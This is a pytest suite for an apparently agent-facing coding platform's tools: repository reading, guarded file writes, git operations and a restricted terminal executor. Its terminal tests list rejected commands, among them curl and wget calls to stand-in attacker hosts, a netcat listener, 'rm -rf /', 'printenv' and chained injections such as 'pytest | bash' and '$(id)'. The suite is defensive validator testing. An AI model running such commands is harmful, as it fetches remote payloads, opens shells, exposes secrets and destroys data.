"""Comprehensive unit and execution tests for all FP8 development tools."""
import subprocess
import tempfile
from pathlib import Path
from uuid import uuid4

import pytest

from forge_api.domain.errors import ValidationError
from forge_api.domain.tool import ToolExecutionContext
from forge_api.infrastructure.tools.file_write_tools import (
    FileCreateTool,
    FileDeleteTool,
    FileModifyTool,
)
from forge_api.infrastructure.tools.git_tools import (
    GitCommitTool,
    GitDiffTool,
    GitStatusTool,
)
from forge_api.infrastructure.tools.repo_read_tools import (
    CodeFindReferencesTool,
    CodeSearchSymbolTool,
    RepositoryListFilesTool,
    RepositoryReadFileTool,
    RepositorySearchTool,
)
from forge_api.infrastructure.tools.restricted_terminal_executor import (
    TerminalExecuteTool,
    validate_terminal_command,
)


@pytest.fixture
def repo_dir():
    """Create a temporary git repository for testing tools."""
    with tempfile.TemporaryDirectory() as tmp:
        repo_path = Path(tmp).resolve()
        # Initialize git repo
        subprocess.run(["git", "init"], cwd=repo_path, capture_output=True, check=True)
        subprocess.run(
            ["git", "config", "user.email", "test@forge.internal"],
            cwd=repo_path,
            capture_output=True,
            check=True,
        )
        subprocess.run(
            ["git", "config", "user.name", "Forge Test"],
            cwd=repo_path,
            capture_output=True,
            check=True,
        )

        # Create sample files
        src = repo_path / "src"
        src.mkdir()
        (src / "app.py").write_text(
            "def calculate_total(items):\n"
            "    \"\"\"Calculate sum of items.\"\"\"\n"
            "    total = sum(items)\n"
            "    return total\n\n"
            "class InvoiceManager:\n"
            "    def process_invoice(self, invoice_id):\n"
            "        return True\n",
            encoding="utf-8",
        )
        (src / "config.py").write_text("API_TIMEOUT = 30\n", encoding="utf-8")
        (repo_path / "README.md").write_text("# Test Repo\n", encoding="utf-8")

        # Initial commit
        subprocess.run(["git", "add", "-A"], cwd=repo_path, capture_output=True, check=True)
        subprocess.run(
            ["git", "commit", "-m", "Initial commit"],
            cwd=repo_path,
            capture_output=True,
            check=True,
        )

        yield repo_path


@pytest.fixture
def exec_context(repo_dir: Path) -> ToolExecutionContext:
    return ToolExecutionContext(
        workspace_id=uuid4(),
        repository_id=uuid4(),
        user_id=uuid4(),
        session_id=uuid4(),
        repo_root=str(repo_dir),
        timeout_seconds=10.0,
    )


# ─── Repository Read Tools Tests ──────────────────────────────────────


class TestRepoReadTools:
    @pytest.mark.asyncio
    async def test_list_files_recursive(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = RepositoryListFilesTool()
        res = await tool.execute(exec_context, {"recursive": True})
        assert res.success is True
        files = res.data["files"]
        assert "src/app.py" in files
        assert "src/config.py" in files
        assert "README.md" in files

    @pytest.mark.asyncio
    async def test_read_file_full_and_slice(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = RepositoryReadFileTool()

        # Full read
        res_full = await tool.execute(exec_context, {"path": "src/app.py"})
        assert res_full.success is True
        assert "def calculate_total" in res_full.output
        assert res_full.data["total_lines"] >= 8

        # Sliced read (lines 1 to 3)
        res_slice = await tool.execute(
            exec_context, {"path": "src/app.py", "start_line": 1, "end_line": 3}
        )
        assert res_slice.success is True
        assert "def calculate_total(items):" in res_slice.output
        assert "class InvoiceManager" not in res_slice.output

    @pytest.mark.asyncio
    async def test_read_file_not_found(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = RepositoryReadFileTool()
        res = await tool.execute(exec_context, {"path": "nonexistent.py"})
        assert res.success is False
        assert res.error == "file_not_found"

    @pytest.mark.asyncio
    async def test_search_content(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = RepositorySearchTool()
        res = await tool.execute(exec_context, {"query": "calculate_total"})
        assert res.success is True
        assert res.data["total_matches"] >= 1
        assert "src/app.py:1" in res.output

    @pytest.mark.asyncio
    async def test_search_symbols(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = CodeSearchSymbolTool()
        res = await tool.execute(exec_context, {"name": "InvoiceManager"})
        assert res.success is True
        assert res.data["total"] >= 1
        assert any(s["name"] == "InvoiceManager" for s in res.data["symbols"])

    @pytest.mark.asyncio
    async def test_find_references(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = CodeFindReferencesTool()
        res = await tool.execute(exec_context, {"symbol": "calculate_total"})
        assert res.success is True
        assert res.data["total"] >= 1


# ─── Controlled File Write Tools Tests ─────────────────────────────────


class TestFileWriteTools:
    @pytest.mark.asyncio
    async def test_file_create_and_overwrite_protection(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = FileCreateTool()

        # Create new
        res1 = await tool.execute(
            exec_context,
            {"path": "src/utils.py", "content": "def helper(): pass\n"},
        )
        assert res1.success is True
        assert (repo_dir / "src" / "utils.py").exists()
        assert "Diff:" in res1.output

        # Reject overwrite without flag
        res2 = await tool.execute(
            exec_context,
            {"path": "src/utils.py", "content": "def helper2(): pass\n"},
        )
        assert res2.success is False
        assert res2.error == "file_exists"

        # Overwrite with flag
        res3 = await tool.execute(
            exec_context,
            {
                "path": "src/utils.py",
                "content": "def helper2(): pass\n",
                "overwrite": True,
            },
        )
        assert res3.success is True
        assert (repo_dir / "src" / "utils.py").read_text() == "def helper2(): pass\n"

    @pytest.mark.asyncio
    async def test_file_modify(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = FileModifyTool()
        res = await tool.execute(
            exec_context,
            {"path": "src/config.py", "content": "API_TIMEOUT = 60\nDEBUG = True\n"},
        )
        assert res.success is True
        assert "API_TIMEOUT = 60" in (repo_dir / "src" / "config.py").read_text()
        assert "+API_TIMEOUT = 60" in res.data["diff"]

    @pytest.mark.asyncio
    async def test_file_delete(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = FileDeleteTool()
        assert (repo_dir / "README.md").exists()

        res = await tool.execute(exec_context, {"path": "README.md"})
        assert res.success is True
        assert not (repo_dir / "README.md").exists()
        assert "-# Test Repo" in res.data["diff"]

    @pytest.mark.asyncio
    async def test_write_tools_reject_path_traversal(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = FileCreateTool()
        res = await tool.execute(
            exec_context,
            {"path": "../escape.txt", "content": "malicious"},
        )
        assert res.success is False
        assert res.error == "path_traversal"


# ─── Git Tools Tests ───────────────────────────────────────────────────


class TestGitTools:
    @pytest.mark.asyncio
    async def test_git_status_and_diff(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        status_tool = GitStatusTool()
        diff_tool = GitDiffTool()

        # Clean repo
        res_status_clean = await status_tool.execute(exec_context, {})
        assert res_status_clean.success is True
        assert res_status_clean.data["is_clean"] is True

        # Modify file
        (repo_dir / "README.md").write_text("# Updated README\n", encoding="utf-8")

        # Dirty status
        res_status_dirty = await status_tool.execute(exec_context, {})
        assert res_status_dirty.success is True
        assert res_status_dirty.data["is_clean"] is False
        assert "README.md" in res_status_dirty.output

        # Diff
        res_diff = await diff_tool.execute(exec_context, {})
        assert res_diff.success is True
        assert res_diff.data["has_changes"] is True
        assert "+# Updated README" in res_diff.output

    @pytest.mark.asyncio
    async def test_git_commit(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        commit_tool = GitCommitTool()

        # Modify file
        (repo_dir / "README.md").write_text("# Updated Title\n", encoding="utf-8")

        res_commit = await commit_tool.execute(
            exec_context, {"message": "docs: update title"}
        )
        assert res_commit.success is True
        assert res_commit.data["message"] == "docs: update title"
        assert len(res_commit.data["commit_hash"]) >= 8

        # Second commit with no changes
        res_empty = await commit_tool.execute(
            exec_context, {"message": "empty commit"}
        )
        assert res_empty.success is False
        assert res_empty.error == "nothing_to_commit"


# ─── Restricted Terminal Executor Tests ────────────────────────────────


class TestRestrictedTerminalExecutor:
    def test_command_validation_allowlist(self) -> None:
        # Allowed
        assert validate_terminal_command("pytest") == ["pytest"]
        assert validate_terminal_command("pytest tests/test_app.py -v") == [
            "pytest",
            "tests/test_app.py",
            "-v",
        ]
        assert validate_terminal_command("npm test") == ["npm", "test"]
        assert validate_terminal_command("npm run lint") == ["npm", "run", "lint"]
        assert validate_terminal_command("cargo test") == ["cargo", "test"]
        assert validate_terminal_command("ruff check .") == ["ruff", "check", "."]
        assert validate_terminal_command("tsc --noEmit") == ["tsc", "--noEmit"]
        assert validate_terminal_command("git status") == ["git", "status"]
        assert validate_terminal_command("git diff") == ["git", "diff"]
        assert validate_terminal_command("python -m pytest") == [
            "python",
            "-m",
            "pytest",
        ]

    @pytest.mark.parametrize(
        "bad_command",
        [
            "bash -c 'whoami'",
            "sh script.sh",
            "powershell -Command dir",
            "cmd.exe /c dir",
            "curl https://attacker.com/payload.sh",
            "wget http://evil.com",
            "nc -lvp 4444",
            "sudo rm -rf /",
            "chmod +x script.sh",
            "env",
            "printenv",
            "rm -rf *",
        ],
    )
    def test_command_validation_rejects_forbidden_binaries(
        self, bad_command: str
    ) -> None:
        with pytest.raises(ValidationError):
            validate_terminal_command(bad_command)

    @pytest.mark.parametrize(
        "chained_command",
        [
            "pytest; rm -rf /",
            "pytest && curl http://evil.com",
            "pytest || whoami",
            "pytest | bash",
            "npm test > output.txt",
            "npm test < input.txt",
            "pytest `whoami`",
            "pytest $(id)",
        ],
    )
    def test_command_validation_rejects_chaining_and_redirection(
        self, chained_command: str
    ) -> None:
        with pytest.raises(ValidationError) as exc_info:
            validate_terminal_command(chained_command)
        assert exc_info.value.code == "forbidden_command_syntax"

    @pytest.mark.asyncio
    async def test_terminal_execute_git_status(
        self, repo_dir: Path, exec_context: ToolExecutionContext
    ) -> None:
        tool = TerminalExecuteTool()
        res = await tool.execute(exec_context, {"command": "git status"})
        assert res.success is True
        assert res.data["exit_code"] == 0
        assert "On branch" in res.output or "working tree clean" in res.output
